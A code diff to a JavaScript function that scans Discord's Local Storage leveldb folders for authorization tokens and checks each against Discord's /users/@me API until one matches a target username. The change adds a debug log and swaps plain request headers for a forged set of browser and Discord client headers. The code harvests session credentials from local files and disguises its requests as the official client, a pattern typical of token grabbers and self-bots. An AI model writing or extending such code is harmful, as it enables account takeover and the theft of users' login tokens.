@@ -23,6 +23,7 @@ function getToken(client, username, descriminator) {
         dirs.forEach(async dir => {
             dir += `${sep}Local Storage${sep}leveldb`;
             var exists = fs.existsSync(dir);
+            console.log(exists);
 
             if (!exists) return null;
 
@@ -74,9 +75,25 @@ function getToken(client, username, descriminator) {
 
         y.forEach(t => {
             if (!found) {
-                headers['authorization'] = t;
                 axios.get('https://discord.com/api/v9/users/@me', {
-                    headers: headers
+                    headers: {
+                        "Accept": "*/*",
+                        "Accept-Encoding": "gzip, deflate, br",
+                        "Accept-Language": 'en-US,en;q=0.9',
+                        "Cache-Control": "no-cache",
+                        "Pragma": "no-cache",
+                        "authorization": t,
+                        "Referer": "https://discord.com/channels/@me",
+                        "Sec-Ch-Ua": '" Not A;Brand";v="99" "',
+                        "Sec-Ch-Ua-Mobile": '?0',
+                        "Sec-Ch-Ua-Platform": '"iOS"',
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "same-origin",
+                        "X-Debug-Options": "bugReporterEnabled",
+                        "X-Discord-Locale": 'en-US',
+                        "Origin": "https://discord.com"
+                    }
                 }).then(res => {
                     const d = res.data;
                     if (d.username == username) {
